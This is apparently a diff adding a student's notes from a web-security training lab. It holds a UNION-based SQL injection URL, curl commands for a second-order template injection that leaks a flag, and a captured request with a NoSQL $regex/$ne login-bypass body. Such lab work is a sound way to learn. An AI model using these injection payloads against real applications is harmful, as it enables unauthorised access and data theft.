@@ -1,1 +1,51 @@
 http://web0x01.hbtn/api/a3/sql_injection/all_orders?status=no%27%20UNION%20SELECT%20NULL,NULL,NULL,NULL,value%20FROM%20%20not_me;--
+
+
+┌──(kali㉿kali)-[~]
+└─$ curl -X POST http://web0x01.hbtn/api/a3/sql_injection/second_order/register \
+-H "Content-Type: application/json" \
+-d '{"username": "test4", "name": "{{FLAG.__str__()}}", "password": "test123"}'
+{"message":"User created successfully","success":true}
+
+
+┌──(kali㉿kali)-[~]
+└─$ curl -X POST http://web0x01.hbtn/api/a3/sql_injection/second_order/login \   
+-H "Content-Type: application/json" \
+-d '{"username": "test4", "password": "test123"}'                              
+{"message":{"html":"<h1>Welcome Mr 1b21c1fe44e0014bf3bda5477c85f9ab</h1>","name":"{{FLAG.__str__()}}","username":"test4"},"success":true}
+
+
+-----------------
+POST /api/a3/nosql_injection/sign_in HTTP/1.1
+
+Host: web0x01.hbtn
+
+User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0
+
+Accept: */*
+
+Accept-Language: en-US,en;q=0.5
+
+Accept-Encoding: gzip, deflate, br
+
+Referer: http://web0x01.hbtn/a3/nosql_injection/
+
+content-type: application/json
+
+Content-Length: 68
+
+Origin: http://web0x01.hbtn
+
+Connection: keep-alive
+
+Cookie: session=LsdcCt33H1iHe-dTHGfMo-2XaXKB7lbbzer_a13GDL8.ImOVS2YsEQBmeLf0E-py0QgfeU8
+
+
+
+{
+
+  "username": { "$regex": "^e" },
+
+  "password": { "$ne": "" }
+
+}
